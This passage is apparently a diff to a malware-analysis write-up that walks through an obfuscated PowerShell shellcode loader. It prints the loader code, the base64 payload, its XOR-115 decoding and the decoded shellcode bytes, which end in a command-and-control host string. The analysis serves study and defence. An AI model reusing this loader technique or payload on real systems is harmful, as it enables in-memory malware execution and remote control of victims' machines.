@@ -123,12 +123,61 @@ else {
 This is more Powershell code
 
 ### Break Down 3:
-1. Set-StrictMode -Version 2: When Strict Mode is enabled, violating the set programming rules will produce terminating errors in our scripts. Strict Mode to Version 2.0 will prohibit you from referencing variables that have not been initialized.
- And will also prohibit you from referencing initialized variables, in addition to prohibiting references to non-existent properties on objects, function calls using the syntax for calling methods, and variables without names.
+1. Set-StrictMode -Version 2: When Strict Mode is enabled, violating the set programming rules will produce terminating errors in our scripts. Strict Mode to Version 2.0 will prohibit you from referencing variables that have not been initialized. It will also prohibit you from referencing initialized variables, in addition to prohibiting references to non-existent properties on objects, function calls using the syntax for calling methods, and variables without names.
 2. $DoIt: declaring a variable that is equal to everything between the 'at' signs '@'
-3. $var_buffer: 0x3000 indicates “reserve and commit this memory”, and the 0x40 indicates “this memory should be readable, writable, and executable.”
-4. BASE64 (3): base64 code is easily decoded using cyberchef with the options "from base64" no other options needed. however this is also binary and not human readable. 
+3. func_get_proc_address: retrieve the address of a function within a specified DLL
+4. func_get_delegate_type: create a custom delegate type dynamically at runtime, specifying its parameter types and return type
+5. [Byte[]]$var_code: variable containing raw byte array. 
+6. BASE64 (3): base64 code is easily decoded using cyberchef with the options "from base64" no other options needed. however this is also binary and not human readable. 
 ``` 
 ússsúB¡ø!Cø!ø!gø[|Ä9UBB³ßOq_S²¼~r´!$ø!cø1Or£ø3ö³9r£#ø;kø+Sr O:øGør¥BB³ß²¼~r´KpHW+ø+Wr ø8ø+or øwør£ú7WW((*)"+,)øaõ.s'?Ut¦ssssB$$$$$I%
 Ô¦×sss(Bº""p""Èrss #$úìµ¦#ÿsss(B¡!sA³÷!!! !#&]H¦úµð°#ó@ssúw#l%5íõ¦,B$$ %^uk¦ö³|÷¹rssBöwúzÙ¶.¦ú²6R-B¦B$t"%#Ä$x¦Ìs\ssJ´t+#Bârssºrss\6)$sx$ØTðÂÇÓõ©ûcÇÞëÖ©Òºë9ÎÑ¨øf¨3#&ÀfGò®äÏ¶¾é?{ï'OÊüä/©ù	º5kýs&^2IS>	\F]CS[HS> :6SJ]CHS$S='SE]BHS'\F]CHS1<:6JH#'1!Z~ys¨ËÕþcöHðð´ªS~¿¿5¹+-ÉV£Ñ:ÉKÍWeÔcß]K`	ôJâ.ÿHùfÅDÞx2)M±ºwÅ`dÑå'VB+qr6þÐÓ8[°¤Õèâ´u¾­Õ·[ùYéö?¹Ô¥°´_MìÝHFàMI"ÜJ``bN.Éã=g³ô6Éý±$î)È¥{[´x2óuÂÔ#¬¦5meÉ«óû*VC$<º@¶ ¬#êñå2sÆÑ%¦3scssss3s$+× ¦àÊssssrª" ú$sSss %aåú¦ö³µøtr°ö³+°ú]]ssssp
+```
+7. for loop: goes through each byte from the previous array and xors it with with they byte value 115 to get the real byte. 
+8. $var_va: gets functions pointers and passes them to functions identified earlier. 
+9. $var_buffer: 0x3000 indicates “reserve and commit this memory”, and the 0x40 indicates “this memory should be readable, writable, and executable.”
+10. [System.Runtime.InteropServices.Marshal]::Copy: Copies data from a managed array to an unmanaged memory pointer, or from an unmanaged memory pointer to a managed array.
+11. $var_runme: retrieves a function pointer stored in $var_buffer and then invokes it with IntPtr::Zero
+12. If: checks if system is 64bit using [IntPtr]::size -eq 8
+    - if 64bit run with parameters/arguements as 32bit
+    - else invoke-expresion $DoIt
+
+
+## $var_code Deobfuscation:
+I modified the code to get the byte array
+```powershell
+$DoIt = @'
+function func_get_proc_address {
+        Param ($var_module, $var_procedure)
+        $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+        $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+        return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
+}
+
+function func_get_delegate_type {
+        Param (
+                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
+                [Parameter(Position = 1)] [Type] $var_return_type = [Void]
+        )
+
+        $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+        $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
+        $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
+
+        return $var_type_builder.CreateType()
+}
+
+[Byte[]]$var_code = [System.Convert]::FromBase64String('j5v6c3NzE/qWQqEX+CFD+CF/+CFn+AFbfMQ5VUKMQrPfTxIPcV9Tsrx+crSRgyEk+CFj+DFPcqP4Mwv2swc5cqMj+Dtr+CtTcqCQTzr4R/hypUKMQrPfsrx+crRLkwaHcA6LSA5XBpEr+CtXcqAV+H84+CtvcqD4d/hyo/o3V1coKBIqKSKMkyssKfhhmPUuGx0WB3MbBBodGicbPwRVdIymm3Nzc3NCjCQkJCQkG0klCtSMpprXc3NzKEK6IiIZcCIiG8hyc3MgIxsk+uy1jKYjmv9zc3MoQqEhG3NBs/chISEgISMbmCZdSIym+rXwsCMb80Bzc/qTGXcjGWwlGwY17fWMpixCjCQkGYwgJRtedWsIjKb2s3z3uXJzc0KM9oUHd/qKmHob2baRLoym+rIbNlItQoymQowkGXQiJSMbxCSTeIymzHNcc3NKtAZ0KyOaCIyMjEKMmuJyc3OaunJzc5scjIyMXDYpJBVzGBx4JNhU8MLH0/Wp+2OXxwjehevWqQvSuus5ztGohvhmqDMjJsBmHYVH8gGu5M+2AL7pP3vvJ0+dD8r85BkvhKn5Cbo1axeU/XMmABYBXjIUFh0HSVM+HAkaHx8SXEZdQ1NbEBweAxIHGhEfFkhTPiA6NlNKXUNIUyQaHRccBABTPSdTRV1CSFMnARoXFh0HXEZdQ0hTMTw6NkpIIycxIVp+eXOoBsvVGP6BY/ZI8BXwtIOqG4lTF36/h781uSuKLclWo9E6yUvNEINXZQfUY4XfXRqfS2AXioYJ9JlK4i7/SBr5ZsVE3ngyEilNsbp/d8VgZIXR5ScGVkIrcXKaNv7QkdM4W7Ck1eiRl5nilbR1vpit1bdbhPlZ6R32P7kT1KWwB7RfTezdm0hGiOBNSSLcSmBgFGIPTpoDLsnjPWez9DbJ/bEk7imeyKV7W7R4MvMcBoV1wtQjrKY1bWXJqwebG/P7KlZDJDy6QAu2IBsUiqwOI+rx5TJzG4PG0SWMphkzG3Njc3Mbc3MzcyQbK9cgloym4Mpzc3NzcqoiIPqUJBtzU3NzICUbYeX6kYym9rMHtfh0crD2swaWK7Cb+o6MjBESF10eHBcWAwYAG10aHHNzc3Nw')
+
+for ($x = 0; $x -lt $var_code.Count; $x++) {
+        $var_code[$x] = $var_code[$x] -bxor 115
+}
+
+write-host $var_code
+'@
+```
+
+### Output:
+```
+252 232 137 0 0 0 96 137 229 49 210 100 139 82 48 139 82 12 139 82 20 139 114 40 15 183 74 38 49 255 49 192 172 60 97 124 2 44 32 193 207 13 1 199 226 240 82 87 139 82 16 139 66 60 1 208 139 64 120 133 192 116 74 1 208 80 139 72 24 139 88 32 1 211 227 60 73 139 52 139 1 214 49 255 49 192 172 193 207 13 1 199 56 224 117 244 3 125 248 59 125 36 117 226 88 139 88 36 1 211 102 139 12 75 139 88 28 1 211 139 4 139 1 208 137 68 36 36 91 91 97 89 90 81 255 224 88 95 90 139 18 235 134 93 104 110 101 116 0 104 119 105 110 105 84 104 76 119 38 7 255 213 232 0 0 0 0 49 255 87 87 87 87 87 104 58 86 121 167 255 213 233 164 0 0 0 91 49 201 81 81 106 3 81 81 104 187 1 0 0 83 80 104 87 137 159 198 255 213 80 233 140 0 0 0 91 49 210 82 104 0 50 192 132 82 82 82 83 82 80 104 235 85 46 59 255 213 137 198 131 195 80 104 128 51 0 0 137 224 106 4 80 106 31 86 104 117 70 158 134 255 213 95 49 255 87 87 106 255 83 86 104 45 6 24 123 255 213 133 192 15 132 202 1 0 0 49 255 133 246 116 4 137 249 235 9 104 170 197 226 93 255 213 137 193 104 69 33 94 49 255 213 49 255 87 106 7 81 86 80 104 183 87 224 11 255 213 191 0 47 0 0 57 199 117 7 88 80 233 123 255 255 255 49 255 233 145 1 0 0 233 201 1 0 0 232 111 255 255 255 47 69 90 87 102 0 107 111 11 87 171 39 131 177 180 160 134 218 136 16 228 180 123 173 246 152 165 218 120 161 201 152 74 189 162 219 245 139 21 219 64 80 85 179 21 110 246 52 129 114 221 151 188 197 115 205 154 76 8 156 84 60 238 124 185 143 151 106 92 247 218 138 122 201 70 24 100 231 142 0 85 115 101 114 45 65 103 101 110 116 58 32 77 111 122 105 108 108 97 47 53 46 48 32 40 99 111 109 112 97 116 105 98 108 101 59 32 77 83 73 69 32 57 46 48 59 32 87 105 110 100 111 119 115 32 78 84 32 54 46 49 59 32 84 114 105 100 101 110 116 47 53 46 48 59 32 66 79 73 69 57 59 80 84 66 82 41 13 10 0 219 117 184 166 107 141 242 16 133 59 131 102 131 199 240 217 104 250 32 100 13 204 244 204 70 202 88 249 94 186 37 208 162 73 186 56 190 99 240 36 22 116 167 16 246 172 46 105 236 56 19 100 249 245 122 135 234 57 145 93 140 59 105 138 21 182 55 173 11 65 97 90 62 194 201 12 4 182 19 23 246 162 150 84 117 37 49 88 2 1 233 69 141 163 226 160 75 40 195 215 166 155 226 228 234 145 230 199 6 205 235 222 166 196 40 247 138 42 154 110 133 76 202 96 167 214 195 116 199 44 62 159 174 232 59 53 251 147 62 58 81 175 57 19 19 103 17 124 61 233 112 93 186 144 78 20 192 135 69 186 142 194 87 157 90 237 187 214 8 40 199 11 65 128 111 117 246 6 177 167 80 223 213 70 30 22 186 216 116 232 104 128 136 89 37 48 87 79 201 51 120 197 83 104 103 249 223 125 80 153 130 150 65 0 104 240 181 162 86 255 213 106 64 104 0 16 0 0 104 0 0 64 0 87 104 88 164 83 229 255 213 147 185 0 0 0 0 1 217 81 83 137 231 87 104 0 32 0 0 83 86 104 18 150 137 226 255 213 133 192 116 198 139 7 1 195 133 192 117 229 88 195 232 137 253 255 255 98 97 100 46 109 111 100 101 112 117 115 104 46 105 111 0 0 0 0 3
 ```
